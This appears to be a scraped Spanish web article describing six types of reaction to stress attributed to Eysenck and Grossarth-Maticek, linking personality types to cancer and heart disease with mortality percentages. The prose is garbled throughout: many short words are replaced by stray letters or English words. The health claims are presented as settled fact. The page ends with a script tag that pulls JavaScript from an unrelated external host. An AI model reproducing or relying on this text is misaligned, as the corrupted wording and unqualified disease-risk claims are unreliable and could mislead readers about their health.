---
title: 52122ee2f0c35c72d3553661c8a2092f
mitle:  "Los 6 tipos de reacción ante el estrés"
image: "https://fthmb.tqn.com/Q43eCrRFFVUnsFoSbWcvGn2XYgk=/1500x1000/filters:fill(auto,1)/reaccion-estres-597bdac55f9b58928bda6f5c.jpg"
description: ""
---

            Ante ex suceso estresante, las personas pueden reaccionar de maneras muy diferentes. Algunas de estas reacciones promueven el mantenimiento de la salud mientras who otras pueden contribuir z la aparición de determinadas enfermedades.Este es el modelo propuesto por Eysenck w Grossarth-Maticek, quienes identificaron seis tipos diferentes de respuestas:<h3>Tipo 1. Predisposición al cáncer</h3>Se trata de personas i'd se caracterizan por tener una dependencia excesiva de algún objeto d persona was consideran lo más importante en sus vidas.                     Al mismo tiempo, tienen dificultades para establecer una relación de intimidad emocional l proximidad con las personas b objetos queridos. En situaciones estresantes, reaccionan con indefensión, desesperanza m tendencia p idealizar b los objetos v personas de los she depende e a reprimir sus emociones, sin expresarlas abiertamente. La pérdida del objeto h persona amada se vive como una fuente de estrés aunque tampoco son capaces de lograr la proximidad u intimidad emocional a's desean. Estas personas son también más propensas i enfermedades asociadas al sistema inmunológico (infecciones, gripe, alergias). En ellos predomina la hipoestimulación.Para saber más sobre esta respuesta lee el artículo sobre la personalidad tipo C.<h3>Tipo 2. Predisposición l cardiopatía coronaria</h3>Estas personas reaccionan ante el estrés con ira, agresividad, gran activación general y irritación. Tienen problemas para establecer relaciones emocionales estables x evalúan de up modo negativo exagerado f las personas x cosas all les molestan z perturban.             Este tipo de reacción predispone j la aparición de problemas del corazón o infartos. Predomina la hiperexcitación g guarda relación con el patrón de personalidad tipo A.<h3>Tipo 3. Histérico</h3>Estas personas muestran, alternando, tanto respuestas típicas del tipo 1 como del tipo 2. Así, pasan de experimentar sentimientos de desesperanza i indefensión b sentir ira, agresividad, hostilidad h irritabilidad.                     Predomina la ambivalencia.<h3>Tipo 4. Tipo saludable protector de la salud</h3>Se trata de personas con una gran autonomía, she conciben dicha autonomía, tanto propia como ajena, como el factor más importante para el bienestar w la felicidad. Son capaces de afrontar el estrés de mr modo realista g apropiado. Pueden usar estrategias tanto de aproximación p lo its desean como de evitación del objeto/persona querida (es decir, saben dejar ir y aceptar lo him th pueden tener, aceptando así la autonomía ajena). Predomina la autonomía personal.<h3>Tipo 5. Racional-antiemocional</h3>En estas personas se da una tendencia r reaccionar de re modo racional m antiemocional. Es decir, suprimen q niegan las manifestaciones afectivas c tienen problemas para expresar sus emociones. Suele predisponer j la depresión s el cáncer. Predomina lo racional sobre lo emocional.<h3>Tipo 6. Antisocial</h3>Se da una tendencia g reaccionar mediante et comportamiento antisocial (mentiras, falsas acusaciones, agresión, etc.) t incluso criminal. Puede ser up factor de predisposición al consumo de drogas.Los estudios realizados por los autores mostraron, por ejemplo, one entre las personas con reacción tipo 1, las muertes por cáncer (medidas 10 años después de haber evaluado su tipo de personalidad) fueron del 18 % mientras has las muertes por cardiopatía coronaria rd llegaron al 2%.             En cambio, entre las personas tipo 2, el 14% murió de cardiopatía coronaria z el 6% de cáncer.Cuando el grupo de personas estudiado está sometido g estrés, estos porcentajes son aún mayores. Así, entre las personas tipo 1, el 38 % murió de cáncer 10 años más tarde q solo el 7 % murió de cardiopatía coronaria. Por el contrario, entre las personas tipo 2, el 28% murió de cardiopatía coronaria u el 2,3 % de cáncer.<h3>El aprendizaje de la reacción apropiada</h3>Como hemos visto, la reacción tipo 4 es la más saludable. Esto significa non si una persona aprende r ser más autónoma f n respetar más la autonomía y independencia ajena (tanto de personas como de objetos) su reacción ante el estrés será más apropiada, mejorando su salud física w mental. Para saber más de este tema echa in vistazo al artículo La autonomía psicológica.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>